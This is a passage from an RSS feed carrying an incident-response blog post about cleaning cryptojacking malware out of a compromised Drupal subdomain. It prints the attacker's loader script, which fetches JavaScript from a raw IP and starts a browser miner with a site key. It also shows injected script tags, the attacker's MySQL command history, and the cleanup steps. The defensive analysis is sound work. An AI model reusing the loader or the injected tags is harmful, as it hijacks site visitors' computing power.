+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x4&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;readyState&amp;#34;&lt;/span&gt;]){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x4&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onreadystatechange&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x4&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;readyState&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loaded&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x4&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;readyState&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;complete&amp;#34;&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x4&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onreadystatechange&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x3&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x4&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onload&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x3&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x4&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;src&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x2&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  document[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;getElementsByTagName&amp;#34;&lt;/span&gt;](&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;head&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;appendChild&amp;#34;&lt;/span&gt;](&lt;span style=&#34;color:#a6e22e&#34;&gt;_0x17a8x4&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;loadScript&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://146.185.234.113/hhY6.js&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;setTimeout&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;miner&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;undefined&amp;#34;&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;miner&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stop&amp;#34;&lt;/span&gt;]()}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;){}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#66d9ef&#34;&gt;typeof&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;_client&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;undefined&amp;#34;&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;_client&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stop&amp;#34;&lt;/span&gt;]()}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;){}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    document[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_client&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Client&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Anonymous&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;56bc34061cd882609aab5de9d411b6e12be622137090334aa0697591bd8c7742&amp;#34;&lt;/span&gt;,{&lt;span style=&#34;color:#a6e22e&#34;&gt;throttle&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.3&lt;/span&gt;});
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    document[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_client&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;start&amp;#34;&lt;/span&gt;](&lt;span style=&#34;color:#a6e22e&#34;&gt;Client&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;FORCE_MULTI_TAB&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  },&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;})
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This script is trying to load more cryptojacking scripts. It has a similar resemblance to: &lt;a class=&#34;link&#34; href=&#34;https://coinhive.com/documentation/miner&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://coinhive.com/documentation/miner&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;mysql-database-lookup&#34;&gt;MySQL Database Lookup
+&lt;/h3&gt;&lt;p&gt;Drupal uses MySQL database to load HTML content from modules. The hidden malicious javascript code (found in HTML) is injected in a MySQL table: block_custom in database: subdomainsite&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   8 | &amp;lt;script type=&amp;#34;text/javascript&amp;#34; src=&amp;#34;https://wt-23afbbf05d73a701c3ef54b49e4de14c-0.sandbox.auth0-extend.com/full-http-control&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| drupal update | php_code |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   9 | &amp;lt;script type=&amp;#34;text/javascript&amp;#34; src=&amp;#34;https://wt-23afbbf05d73a701c3ef54b49e4de14c-0.sandbox.auth0-extend.com/full-http-control&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| drupal updater | full_html |
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looks like these rows are forcing the site to load the cryptojacking scripts. Hence, we clean up these rows from MySQL:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mysql&amp;gt; delete from block_custom where bid=8;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Query OK, 1 row affected (0.05 sec)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;mysql&amp;gt; delete from block_custom where bid=9;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Query OK, 1 row affected (0.03 sec)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After deleting the rows, the footer code disappears, thus removing the malware from loading on the page.&lt;/p&gt;
+&lt;p&gt;Also, when looking at MySQL command history:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@host:/var/www/subdomain$ cat ~/.mysql_history
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show databases;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use subdomainsite;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show tales;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show tables;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select column from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show cloumns from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show columns from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select mail from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show databases;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use subdomainsite;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show columns from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from users where mail like &amp;#39;@drupaler%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from users where mail like &amp;#39;%@drupaler%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;delete from users where mail like &amp;#39;%@drupaler%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select mail from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show databases;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use subdomainsite;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select mail from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from users where mail like &amp;#39;%brainhard%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;delete from users where mail like &amp;#39;%brainhard%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select mail from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;delete from users where mail like &amp;#39;%bee@addmyhome.com%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;delete from users where mail like &amp;#39;%canie.assassins-creed.org%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;delete from users where mail like &amp;#39;%quinn.adkins38@visitnorwayusa.com%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;delete from users where mail like &amp;#39;%menherbalenhancement.com%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show databases;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use WordPressDB;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show tables;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;describe wp_posts;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from wp_posts;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;describe wp_posts;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show databases;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use subdomainsite;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select mail from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from users where mail like &amp;#39;%@drupaler%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from users where mail like &amp;#39;%drupaler%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from users where mail like &amp;#39;%drupal%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select mail from users where mail like &amp;#39;%drupal%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;delete from users where mail like &amp;#39;%drupal%&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select mail from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use subdomainsite;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select mail from users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show databases;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use WordPressDB;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;show tables;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;describe wp_users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from wp_users; …
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Seems like they tried to delete their spamming email domains: &lt;a class=&#34;link&#34; href=&#34;https://www.pozzo-balbi.com/help/List_of_email_spamming_domains&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.pozzo-balbi.com/help/List_of_email_spamming_domains&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Now, the webshell IRC connections and phishing activities stopped!&lt;/p&gt;
+&lt;p&gt;CAUSE: The current Drupal version (running on the webserver) has a vulnerability for XSS attacks. This was confirmed with grabber vulnerability scanner tool.
+SOLUTION: Possible solution is to patch the Drupal system, but since we are not using the subdomain website, we can shutdown that domain.&lt;/p&gt;
+&lt;h3 id=&#34;cleaning-up&#34;&gt;Cleaning Up
+&lt;/h3&gt;&lt;p&gt;Since we are not using the subdomain site, we shut it down:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$vim /etc/apache2/sites-available/default-ssl.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;   #&amp;lt;VirtualHost _default_:443&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    #    ServerAdmin admin@email.ca
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    #    ServerName  subdomain.website.ca
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    #    # Indexes + Directory Root.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    #    DirectoryIndex index.php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    #    DocumentRoot /var/www/subdomain/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    # …
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;$sudo service apache2 restart
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For safety purposes, we block SMTP Port and stop the mail service:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo iptables -A INPUT -i eth0 -p tcp --destination-port 25 -j DROP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /etc/init.d/postfix stop
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        
+    </channel>
+</rss>
